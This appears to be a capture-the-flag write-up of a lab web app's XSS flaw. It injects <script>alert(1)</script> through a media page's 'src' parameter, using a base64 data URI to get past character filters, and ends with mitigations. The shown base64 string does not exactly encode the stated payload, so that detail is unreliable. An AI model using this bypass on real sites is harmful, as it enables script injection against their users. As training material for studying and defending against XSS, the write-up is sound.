```
http://{IP_ADDRESS}/?page=media&src=nsa
```

When we inspect the site, we see this in the nsa image;

```html
<object data="http://192.168.193.129/images/nsa_prism.jpg"></object>
```

So, what we understand from this is that whatever we enter for the src value, that value is sent to the server.
Our payload is classic:

```html
<script>alert(1)</script>
```
But it doesn't work when we write it directly.
For this reason, we use;
```
data:content/type;base64,
```

in the form of DataUri + base64.

```
<script>alert(1)</script>  == PHNjcmlwdD5hbGVydCgxKTxzY3JpcHQ+
```

We convert it to Base64.
This way, we will tell the browser that this is text/html and have it decode and embed it into the site.

```
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTxzY3JpcHQ+
```

So, we can get the flag.

# How did this Vulnerability work?

With Base64, we were able to bypass the filters that the website blocked, like (`<`, `>`, `'`, `"`).
To avoid breaking the HTML data, we injected **<script>alert(1)</script>** using base64.

# How can we avoid this Vulnerability?

1.  **Content Security Policy**: Set strict CSP headers
2.  **Input Validation**: Validate `src` against allowed patterns
3.  **Avoid dynamic `<object>` tags**: Use safer HTML elements (like `<img>` for images)
